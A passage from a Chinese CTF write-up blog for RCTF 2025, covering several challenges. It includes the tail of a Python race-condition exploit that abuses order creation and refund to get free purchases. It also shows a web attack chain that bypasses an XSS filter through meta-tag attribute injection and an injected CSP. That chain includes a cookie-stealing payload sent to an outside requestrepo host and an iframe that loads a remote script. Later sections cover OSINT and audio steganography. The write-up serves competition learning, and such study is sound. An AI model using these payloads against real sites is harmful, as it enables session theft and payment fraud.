</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  [-] base order failed:&#34;</span><span class=p>,</span> <span class=n>base_resp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>base_order_id</span> <span class=o>=</span> <span class=n>base_resp</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>][</span><span class=s2>&#34;order&#34;</span><span class=p>][</span><span class=s2>&#34;id&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>create_result</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=n>refund_result</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>t_create</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>nonlocal</span> <span class=n>create_result</span>
</span></span><span class=line><span class=cl>            <span class=n>create_result</span> <span class=o>=</span> <span class=n>create_order</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>token</span><span class=p>,</span> <span class=n>target_pid</span><span class=p>,</span> <span class=n>quantity</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=n>coupon_id</span><span class=o>=</span><span class=kc>None</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>t_refund</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>nonlocal</span> <span class=n>refund_result</span>
</span></span><span class=line><span class=cl>            <span class=n>refund_result</span> <span class=o>=</span> <span class=n>refund_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>base_order_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>threads</span> <span class=o>=</span> <span class=p>[</span><span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>t_create</span><span class=p>),</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>t_refund</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>threads</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>threads</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>balance</span> <span class=o>=</span> <span class=n>get_user_balance</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>target_order_id</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=n>success_create</span> <span class=o>=</span> <span class=n>create_result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>create_result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>success_create</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target_order_id</span> <span class=o>=</span> <span class=n>create_result</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>][</span><span class=s2>&#34;order&#34;</span><span class=p>][</span><span class=s2>&#34;id&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>orders</span> <span class=o>=</span> <span class=n>get_orders</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>has_target_completed</span> <span class=o>=</span> <span class=nb>any</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>o</span><span class=p>[</span><span class=s2>&#34;productId&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=n>target_pid</span> <span class=ow>and</span> <span class=n>o</span><span class=p>[</span><span class=s2>&#34;status&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;COMPLETED&#34;</span> <span class=k>for</span> <span class=n>o</span> <span class=ow>in</span> <span class=n>orders</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [*] balance=</span><span class=si>{</span><span class=n>balance</span><span class=si>}</span><span class=s2>, target_completed=</span><span class=si>{</span><span class=n>has_target_completed</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>balance</span> <span class=o>==</span> <span class=n>Decimal</span><span class=p>(</span><span class=s2>&#34;10.00&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>has_target_completed</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [+] Got free COMPLETED order for </span><span class=si>{</span><span class=n>target_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>target_order_id</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [*] refund target order </span><span class=si>{</span><span class=n>target_order_id</span><span class=si>}</span><span class=s2> to restore balance&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>refund_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>target_order_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>balance_after</span> <span class=o>=</span> <span class=n>get_user_balance</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [*] balance after refund=</span><span class=si>{</span><span class=n>balance_after</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>balance_after</span> <span class=o>&lt;</span> <span class=n>Decimal</span><span class=p>(</span><span class=s2>&#34;4.20&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  [-] balance too low after refund, give up this user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>balance</span> <span class=o>&lt;</span> <span class=n>Decimal</span><span class=p>(</span><span class=s2>&#34;4.20&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  [-] balance too low, give up this user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [-] Max tries reached for </span><span class=si>{</span><span class=n>target_name</span><span class=si>}</span><span class=s2>, give up on this user.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conditions_satisfied</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>product_ids</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>orders</span> <span class=o>=</span> <span class=n>get_orders</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>balance</span> <span class=o>=</span> <span class=n>get_user_balance</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>coupon</span> <span class=o>=</span> <span class=n>get_coupon_info</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>completed</span> <span class=o>=</span> <span class=p>[</span><span class=n>o</span> <span class=k>for</span> <span class=n>o</span> <span class=ow>in</span> <span class=n>orders</span> <span class=k>if</span> <span class=n>o</span><span class=p>[</span><span class=s2>&#34;status&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;COMPLETED&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>completed_pids</span> <span class=o>=</span> <span class=p>{</span><span class=n>o</span><span class=p>[</span><span class=s2>&#34;productId&#34;</span><span class=p>]</span> <span class=k>for</span> <span class=n>o</span> <span class=ow>in</span> <span class=n>completed</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>has_all_products</span> <span class=o>=</span> <span class=nb>all</span><span class=p>(</span><span class=n>pid</span> <span class=ow>in</span> <span class=n>completed_pids</span> <span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=n>product_ids</span><span class=o>.</span><span class=n>values</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>has_balance_10</span> <span class=o>=</span> <span class=n>balance</span> <span class=o>==</span> <span class=n>Decimal</span><span class=p>(</span><span class=s2>&#34;10.00&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>has_unused_coupon</span> <span class=o>=</span> <span class=ow>not</span> <span class=n>coupon</span><span class=p>[</span><span class=s2>&#34;isUsed&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>has_all_products</span><span class=p>,</span> <span class=n>has_balance_10</span><span class=p>,</span> <span class=n>has_unused_coupon</span><span class=p>,</span> <span class=n>orders</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/flag/get&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] /api/flag/get:&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit_once</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>user_id</span><span class=p>,</span> <span class=n>token</span> <span class=o>=</span> <span class=n>register_user</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>products</span> <span class=o>=</span> <span class=n>get_products</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>TARGET_PRODUCTS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>products</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;product </span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2> not found&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>coupon</span> <span class=o>=</span> <span class=n>get_coupon_info</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>coupon_id</span> <span class=o>=</span> <span class=n>coupon</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;[+] User </span><span class=si>{</span><span class=n>user_id</span><span class=si>}</span><span class=s2>, coupon_id=</span><span class=si>{</span><span class=n>coupon_id</span><span class=si>}</span><span class=s2>, balance=</span><span class=si>{</span><span class=n>get_user_balance</span><span class=p>(</span><span class=n>token</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>TARGET_PRODUCTS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ok</span> <span class=o>=</span> <span class=n>zero_cost_purchase</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>products</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>ok</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>has_all</span><span class=p>,</span> <span class=n>has_bal10</span><span class=p>,</span> <span class=n>has_unused</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>conditions_satisfied</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>products</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;[+] Final check: products=</span><span class=si>{</span><span class=n>has_all</span><span class=si>}</span><span class=s2>, balance10=</span><span class=si>{</span><span class=n>has_bal10</span><span class=si>}</span><span class=s2>, coupon_unused=</span><span class=si>{</span><span class=n>has_unused</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>has_all</span> <span class=ow>and</span> <span class=n>has_bal10</span> <span class=ow>and</span> <span class=n>has_unused</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Conditions satisfied, requesting flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>get_flag</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;===== Attempt </span><span class=si>{</span><span class=n>attempt</span><span class=si>}</span><span class=s2> =====&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>exploit_once</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Error in attempt </span><span class=si>{</span><span class=n>attempt</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>因为是条件竞争，所以能不能打出来有点看脸，实现不行刷新靶机多试几次</p><h2 id=author>author</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>augmented-dom-instrumentation.js:1 DOM Invader is NOT enabled.
</span></span><span class=line><span class=cl>xss-shield.js:3 blocked!
</span></span><span class=line><span class=cl>xss-shield.js:517 XSS Shield activated
</span></span></code></pre></td></tr></table></div></div><blockquote><p>我们首先要找到绕过xss-shield.js的方法,先寻找一个其他的可控点</p></blockquote><blockquote><p>查看php源代码发现 htmlspecialchars() 默认不编码单引号</p></blockquote><blockquote><p>发现属性注入利用点</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;author&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&lt;?php</span> <span class=na>echo</span> <span class=err>$</span><span class=na>pageAuthor</span><span class=err>;</span> <span class=err>?</span><span class=p>&gt;</span>&gt;
</span></span></code></pre></td></tr></table></div></div><blockquote><p>可以利用这一点进行任意跳转</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;author&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;0;url=&#34;</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;refresh&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>使用恶意用户名插入CSP策略阻止wafjs加载</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>&#39;script-src-elem http://localhost:8081/assets/js/article.js;script-src unsafe-inline&#39; http-equiv=&#39;Content-Security-Policy&#39;
</span></span></code></pre></td></tr></table></div></div><p>bot侧需改为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>http://blog-app
</span></span><span class=line><span class=cl>augmented-dom-instrumentation.js:1 DOM Invader is NOT enabled.
</span></span><span class=line><span class=cl>5278586407747584:1 Refused to load the script &#39;http://localhost:8081/assets/js/purify.min.js&#39; because it violates the following Content Security Policy directive: &#34;script-src-elem http://localhost:8081/assets/js/article.js&#34;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>5278586407747584:1 Refused to load the script &#39;http://localhost:8081/assets/js/xss-shield.js&#39; because it violates the following Content Security Policy directive: &#34;script-src-elem http://localhost:8081/assets/js/article.js&#34;.
</span></span></code></pre></td></tr></table></div></div><blockquote><p>现在成功使用csp,阻止了xss-shield.js,和purify</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>x</span> <span class=na>onerror</span><span class=o>=</span><span class=s>&#34;new Image().src=&#39;http://cca6vtq5.requestrepo.com/steal?cookie=&#39;+encodeURIComponent(document.cookie);&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>augmented-dom-instrumentation.js:1 DOM Invader is NOT enabled.
</span></span><span class=line><span class=cl>5281336646434816:1 Refused to load the script &#39;http://localhost:8081/assets/js/purify.min.js&#39; because it violates the following Content Security Policy directive: &#34;script-src-elem http://localhost:8081/assets/js/article.js&#34;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>5281336646434816:1 Refused to load the script &#39;http://localhost:8081/assets/js/xss-shield.js&#39; because it violates the following Content Security Policy directive: &#34;script-src-elem http://localhost:8081/assets/js/article.js&#34;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>x:1  GET http://localhost:8081/article/x 404 (Not Found)
</span></span><span class=line><span class=cl>5281336646434816:1 Refused to execute inline event handler because it violates the following Content Security Policy directive: &#34;script-src unsafe-inline unsafe-hashes&#34;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-...&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the &#39;unsafe-hashes&#39; keyword is present.
</span></span></code></pre></td></tr></table></div></div><blockquote><p><code>script-src 'unsafe-inline'</code> 才是合法的形式,<code>script-src unsafe-inline</code>是不合法的htmlspecialchars()又会编码<code>"</code>,所以我无法正确包裹csp头,使用这种方式加载外部脚本获得flag</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>&lt;iframe srcdoc=&#39;&lt;script src=&#34;http://{url}/exp.js&#34;&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=signin>Signin</h2><p>签</p><h2 id=speak-softly-love>Speak Softly Love</h2><p>网络取证题</p><p>第一问</p><p>根据视频的信息，直接在youtube里搜关键词快速定位到了这个视频，答案为8ssDGBTssUI</p><p><img src=/img/2025-RCTF/23.png alt=img></p><p>第二问</p><p>视频介绍里，提到了这个项目的网站</p><p><img src=/img/2025-RCTF/24.png alt=img></p><p>进网站可以看到有对应的项目仓库，装个svn的gui工具</p><p><img src=/img/2025-RCTF/25.png alt=img></p><p>访问仓库，可以看到有若干版本</p><p><img src=/img/2025-RCTF/26.png alt=img></p><p>在v0.9里找到soft error相关的记录，发现revision是178，所以答案是r178（gpt告诉我的格式）</p><p><img src=/img/2025-RCTF/27.png alt=img></p><p>第三问</p><p>在网站里可以快速定位到作者的个人官网https://mateusz.viste.fr/</p><p>在最下面可以找到</p><p><img src=/img/2025-RCTF/28.png alt=img></p><p>答案是https://mateusz.viste.fr/mateusz.ogg</p><p>第四问</p><p>个人主页里提到了有一个gopher空间，访问进去可以找到捐赠链接</p><p><img src=/img/2025-RCTF/29.png alt=img></p><p>或者直接搜关键词也能看到</p><p><img src=/img/2025-RCTF/30.png alt=img></p><p><img src=/img/2025-RCTF/31.png alt=img></p><h2 id=wanna-feel-love>Wanna Feel Love</h2><p>网络取证题</p><p>第一问</p><p>题目给了个附件 里面是有eml邮件</p><p>看了一下邮件内容，一眼垃圾邮件隐写 解隐写拿到</p><p><img src=/img/2025-RCTF/32.png alt=img></p><p>第二问</p><p>邮件里有个xm文件 ai分析一波发现要用OpenMPT打开，下个工具</p><p>说是要提取feel的信息，切到feel的波形发现明显是转01，黑为0红为1</p><p><img src=/img/2025-RCTF/33.png alt=img></p><p><img src=/img/2025-RCTF/34.png alt=img></p><p>写脚本提取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>soundfile</span> <span class=k>as</span> <span class=nn>sf</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>VOLUME_THRESHOLD</span> <span class=o>=</span> <span class=mf>0.3</span>  <span class=c1># 判断音量高低的阈值</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rms_volume</span><span class=p>(</span><span class=n>segment</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;计算该音频片段的 RMS 平均音量&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>np</span><span class=o>.</span><span class=n>sqrt</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>mean</span><span class=p>(</span><span class=n>segment</span> <span class=o>**</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_volume_bits</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>audio</span><span class=p>,</span> <span class=n>sr</span> <span class=o>=</span> <span class=n>sf</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 多声道 -&gt; 单声道</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>audio</span><span class=o>.</span><span class=n>ndim</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>audio</span> <span class=o>=</span> <span class=n>audio</span><span class=o>.</span><span class=n>mean</span><span class=p>(</span><span class=n>axis</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>segment_samples</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=mf>0.050</span> <span class=o>*</span> <span class=n>sr</span><span class=p>)</span>  <span class=c1># 50ms</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bits</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>audio</span><span class=p>),</span> <span class=n>segment_samples</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>segment</span> <span class=o>=</span> <span class=n>audio</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=n>segment_samples</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>segment</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>segment_samples</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
